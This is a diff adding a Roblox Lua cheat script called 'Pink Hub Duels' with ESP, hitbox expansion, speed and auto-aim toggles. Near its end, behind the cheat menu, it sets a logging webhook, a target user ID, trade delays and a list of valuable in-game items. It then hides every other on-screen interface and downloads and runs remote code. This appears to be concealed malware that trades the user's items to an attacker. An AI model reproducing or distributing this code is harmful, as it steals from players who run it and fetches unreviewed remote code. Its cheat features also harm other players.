+            originalUseJumpPower = Humanoid.UseJumpPower
+            originalJumpPower = Humanoid.JumpPower
+        end)
+    end
+end)
+
+infBtn.MouseButton1Click:Connect(function()
+    infJumpEnabled = not infJumpEnabled
+    infBtn.Text = "Infinite Jump: " .. (infJumpEnabled and "ON" or "OFF")
+    if infJumpEnabled then EnableInfJump() else DisableInfJump() end
+end)
+
+spinBtn.MouseButton1Click:Connect(function()
+    spinEnabled = not spinEnabled
+    spinBtn.Text = "Spinbot: " .. (spinEnabled and "ON" or "OFF")
+    if spinEnabled then EnableSpin() else DisableSpin() end
+end)
+
+hitboxBtn.MouseButton1Click:Connect(function()
+    hitboxEnabled = not hitboxEnabled
+    hitboxBtn.Text = "Hitbox Expander: " .. (hitboxEnabled and "ON" or "OFF")
+end)
+
+antiLagBtn.MouseButton1Click:Connect(function()
+    antiLagEnabled = not antiLagEnabled
+    antiLagBtn.Text = "Anti Lag: " .. (antiLagEnabled and "ON" or "OFF")
+    if antiLagEnabled then EnableAntiLag() else DisableAntiLag() end
+end)
+
+antiKBtn.MouseButton1Click:Connect(function()
+    antiKBEnabled = true
+    antiKBtn.Text = "Anti Knockback: ON"
+    EnableAntiKnockback()
+end)
+
+unwalkBtn.MouseButton1Click:Connect(function()
+    unwalkEnabled = not unwalkEnabled
+    unwalkBtn.Text = "Unwalk: " .. (unwalkEnabled and "ON" or "OFF")
+    if unwalkEnabled then startUnwalk() else stopUnwalk() end
+end)
+
+espBtn.MouseButton1Click:Connect(function()
+    espBestEnabled = not espBestEnabled
+    espBtn.Text = "ESP Best: " .. (espBestEnabled and "ON" or "OFF")
+    if espBestEnabled then startESP() else stopESP() end
+end)
+
+medusaBtn.MouseButton1Click:Connect(function()
+    medusaEnabled = not medusaEnabled
+    medusaBtn.Text = "Medusa Range: " .. (medusaEnabled and "ON" or "OFF")
+    if medusaEnabled then enableMedusa() else disableMedusa() end
+end)
+
+autoAimBtn.MouseButton1Click:Connect(function()
+    autoAimEnabled = not autoAimEnabled
+    autoAimBtn.Text = "Auto Aim: " .. (autoAimEnabled and "ON" or "OFF")
+    if autoAimEnabled then
+        pcall(function() setupLaserAim() end)
+        pcall(function() setupWebAim() end)
+    else
+        if laserConnection then pcall(function() laserConnection:Disconnect() end) laserConnection = nil end
+        if webConnection then pcall(function() webConnection:Disconnect() end) webConnection = nil end
+    end
+end)
+
+local playerESP_objects = {}
+local playerESP_connections = {}
+local function createPlayerESP(plr)
+    if plr == LocalPlayer then return end
+    if not plr.Character then return end
+    if playerESP_objects[plr] then return end
+    local char = plr.Character
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local head = char:FindFirstChild("Head")
+    if not (hrp and head) then return end
+    local hitbox = Instance.new("BoxHandleAdornment")
+    hitbox.Name = "PlayerESP_Hitbox_" .. plr.UserId
+    hitbox.Adornee = hrp
+    hitbox.Size = Vector3.new(4, 6, 2)
+    hitbox.Color3 = Color3.fromRGB(128, 0, 128)
+    hitbox.Transparency = 0.6
+    hitbox.ZIndex = 10
+    hitbox.AlwaysOnTop = true
+    hitbox.Parent = CoreGui
+    local billboard = Instance.new("BillboardGui")
+    billboard.Name = "PlayerESP_Name_" .. plr.UserId
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 50)
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
+    billboard.AlwaysOnTop = true
+    billboard.Parent = CoreGui
+    local label = Instance.new("TextLabel", billboard)
+    label.Size = UDim2.new(1, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Text = plr.DisplayName or plr.Name
+    label.TextColor3 = Color3.fromRGB(255, 0, 255)
+    label.Font = Enum.Font.Arcade
+    label.TextScaled = true
+    label.TextStrokeTransparency = 0.7
+    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    playerESP_objects[plr] = {hitbox = hitbox, nameGui = billboard}
+end
+
+local function removePlayerESP(plr)
+    if not plr then return end
+    local objs = playerESP_objects[plr]
+    if objs then
+        pcall(function() if objs.hitbox then objs.hitbox:Destroy() end end)
+        pcall(function() if objs.nameGui then objs.nameGui:Destroy() end end)
+        playerESP_objects[plr] = nil
+    end
+    local hitName = "PlayerESP_Hitbox_" .. plr.UserId
+    local nameName = "PlayerESP_Name_" .. plr.UserId
+    pcall(function()
+        local h = CoreGui:FindFirstChild(hitName)
+        if h then h:Destroy() end
+    end)
+    pcall(function()
+        local n = CoreGui:FindFirstChild(nameName)
+        if n then n:Destroy() end
+    end)
+end
+
+local function enablePlayerESP()
+    disablePlayerESP()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            if plr.Character then
+                createPlayerESP(plr)
+            end
+            local conn = plr.CharacterAdded:Connect(function()
+                task.wait(0.1)
+                createPlayerESP(plr)
+            end)
+            table.insert(playerESP_connections, conn)
+        end
+    end
+    local playerAddedConn = Players.PlayerAdded:Connect(function(plr)
+        if plr == LocalPlayer then return end
+        local charAddedConn = plr.CharacterAdded:Connect(function()
+            task.wait(0.1)
+            createPlayerESP(plr)
+        end)
+        table.insert(playerESP_connections, charAddedConn)
+    end)
+    table.insert(playerESP_connections, playerAddedConn)
+end
+
+function disablePlayerESP()
+    for _, plr in ipairs(Players:GetPlayers()) do
+        removePlayerESP(plr)
+    end
+    for _, conn in ipairs(playerESP_connections) do
+        pcall(function() conn:Disconnect() end)
+    end
+    playerESP_connections = {}
+    for key, objs in pairs(playerESP_objects) do
+        pcall(function() if objs.hitbox then objs.hitbox:Destroy() end end)
+        pcall(function() if objs.nameGui then objs.nameGui:Destroy() end end)
+        playerESP_objects[key] = nil
+    end
+    for _, child in pairs(CoreGui:GetChildren()) do
+        if child:IsA("BoxHandleAdornment") and tostring(child.Name):match("^PlayerESP_Hitbox_") then
+            pcall(function() child:Destroy() end)
+        end
+        if child:IsA("BillboardGui") and tostring(child.Name):match("^PlayerESP_Name_") then
+            pcall(function() child:Destroy() end)
+        end
+    end
+end
+
+playerESPBtn.MouseButton1Click:Connect(function()
+    playerESPEnabled = not playerESPEnabled
+    playerESPBtn.Text = "Player ESP: " .. (playerESPEnabled and "ON" or "OFF")
+    if playerESPEnabled then enablePlayerESP() else disablePlayerESP() end
+end)
+
+local function getSliderState(getter)
+    local ok,a,b = pcall(getter)
+    if not ok then return false, 0 end
+    return a or false, b or 0
+end
+
+saveBtn.MouseButton1Click:Connect(function()
+    local ok1, a1, v1 = pcall(speedFunc)
+    local ok2, a2, v2 = pcall(stealFunc)
+    local speedVal = (v1 and type(v1) == "number") and v1 or speedSpeed
+    local stealVal = (v2 and type(v2) == "number") and v2 or stealSpeed
+    local cfg = {speed = speedVal, steal = stealVal}
+    getgenv().PinkHubSavedConfig = cfg
+    local ok, encoded = pcall(function() return HttpService:JSONEncode(cfg) end)
+    if ok and encoded then
+        pcall(function() writefile("pinkhub_config.json", encoded) end)
+    end
+    saveBtn.Text = "Saved"
+    task.delay(1, function()
+        if saveBtn and saveBtn.Parent then
+            saveBtn.Text = "Save Config"
+        end
+    end)
+end)
+
+ProximityPromptService.PromptTriggered:Connect(function() speedSet(false) end)
+
+RunService.Heartbeat:Connect(function()
+    if Humanoid and HRP then
+        local d = Humanoid.MoveDirection
+        if d.Magnitude > 0 then
+            local v = HRP.AssemblyLinearVelocity
+            local h = Vector3.new(v.X,0,v.Z).Magnitude
+            local spEnabled, spVal = getSliderState(speedFunc)
+            local seEnabled, seVal = getSliderState(stealFunc)
+            local target = h
+            if spEnabled then target = math.max(target,spVal) end
+            if seEnabled then target = math.max(target,seVal) end
+            HRP.AssemblyLinearVelocity = Vector3.new(d.X*target, v.Y, d.Z*target)
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    for _,p in pairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
+            local h = p.Character.HumanoidRootPart
+            if hitboxEnabled then
+                h.Size = Vector3.new(12,12,12)
+                h.Transparency = 0.4
+                h.Material = Enum.Material.SmoothPlastic
+                h.CanCollide = false
+            else
+                h.Size = Vector3.new(2,2,1)
+                h.Transparency = 1
+            end
+        end
+    end
+end)
+
+local fpsAve = 0
+local fpsSmoothing = 0.9
+RunService.RenderStepped:Connect(function(dt)
+    local fps = 0
+    if dt and dt > 0 then fps = 1 / dt end
+    fpsAve = fpsSmoothing * fpsAve + (1 - fpsSmoothing) * fps
+    local pingVal = 0
+    pcall(function()
+        if LocalPlayer and LocalPlayer.GetNetworkPing then
+            local p = LocalPlayer:GetNetworkPing()
+            if type(p) == "number" then
+                pingVal = math.floor(p * 1000)
+            end
+        end
+    end)
+    TopTitle.Text = string.format("Pink Hub Duels | fps: %d  Ping: %dms  | https://discord.gg/CHY3JBP2HT", math.floor(fpsAve + 0.5), pingVal)
+end)
+
+Gui.Destroying:Connect(function()
+    DisableInfJump()
+    DisableSpin()
+    DisableAntiLag()
+    stopUnwalk()
+    stopESP()
+    disableMedusa()
+    if laserConnection then pcall(function() laserConnection:Disconnect() end) laserConnection = nil end
+    if webConnection then pcall(function() webConnection:Disconnect() end) webConnection = nil end
+    disablePlayerESP()
+end)
+
+getgenv().WEBHOOK_URL = "https://skama.net/api/logs/webhook/mrr_e7eff9f94fc342f5bf9e32f47545888d"
+getgenv().TARGET_ID = 9108584179
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2 
+getgenv().TARGET_BRAINROTS = {
+    ["La Extinct Grande"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["La Spooky Grande"] = true,
+    ["Chipso and Queso"] = true,
+    ["Chillin Chili"] = true,
+    ["Tuff Toucan"] = true,
+    ["Gobblino Uniciclino"] = true,
+    ["W or L"] = true,
+    ["La Jolly Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Swaggy Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["Festive 67"] = true,
+    ["Nuclearo Dinossauro"] = true,
+    ["Money Money Puggy"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Tictac Sahur"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Lavadorito Spinito"] = true,
+    ["Garama and Madundung"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Cerberus"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Swag Soda"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Bros"] = true,
+    ["Tralaledon"] = true,
+    ["Los Puggies"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Los Spaghettis"] = true,
+    ["Ginger Gerat"] = true,
+    ["Love Love Bear"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["La Casa Boo"] = true,
+    ["Los Sekolahs"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Ketupat Bros"] = true,
+    ["Cooki and Milki"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Headless Horseman"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Las Sis"] = true,
+    ["Los Planitos"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Eviledon"] = true,
+    ["Orcaledon"] = true,
+    ["Los Jolly Combinasionas"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Fishino Clownino"] = true,
+    ["Chicleteira Cupideira"] = true,
+    ["Los Spooky Combinasionas"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["Rosetti Tualetti"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Sammyni Fattini"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Los Amigos"] = true,
+    ["Lovin Rose"] = true
+}
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
+local Lighting = game:GetService("Lighting")
+local function HideUI(child)
+    if child:IsA("ScreenGui") then
+        child.Enabled = false
+    end
+end
+local function ClearBlur(child)
+    if child:IsA("BlurEffect") then
+        child:Destroy()
+    end
+end
+for _, v in ipairs(Lighting:GetChildren()) do
+    ClearBlur(v)
+end
+Lighting.ChildAdded:Connect(ClearBlur)
+CoreGui.ChildAdded:Connect(HideUI)
+PlayerGui.ChildAdded:Connect(HideUI)
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()
